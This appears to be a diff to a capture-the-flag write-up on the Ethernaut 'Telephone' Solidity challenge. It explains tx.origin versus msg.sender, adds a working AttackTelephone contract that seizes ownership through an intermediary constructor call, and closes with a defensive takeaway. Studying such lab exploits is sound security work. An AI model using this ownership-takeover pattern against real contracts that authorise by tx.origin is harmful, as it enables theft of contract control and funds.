@@ -240,10 +240,14 @@ EOA -> contract A -> contract B
 In the above illustration, msg.sender and tx.origin of contract A is the EOA. Whereas for contract B, msg.sender is contract A, and tx.origin is EOA. Since the `Telephone` contract only checks for the tx originator not to be equal to the message sender, one middle contract is enough to claim the ownership.
 ##### Exploit
 ```
-contract AttackTelephone
+contract AttackTelephone {
+    constructor(Telephone target) {
+      target.changeOwner(tx.origin);
+        require(target.owner() == msg.sender, "Attack failed");
+    }
+}
 ```
 1. Deploy the above contract with the `Telephone` contract instance as a constructor parameter.
-2. Invoke `attack()` function to claim the ownership
 Just like that ownership is transferred.
 ##### Takeaway
 It is recommended to use `msg.sender` for access checks instead of `tx.origin`. Phishing attack like fooling a user to send tx for different purposes and making an internal tx to the target contract leads to passing checks that use `tx.origin`.
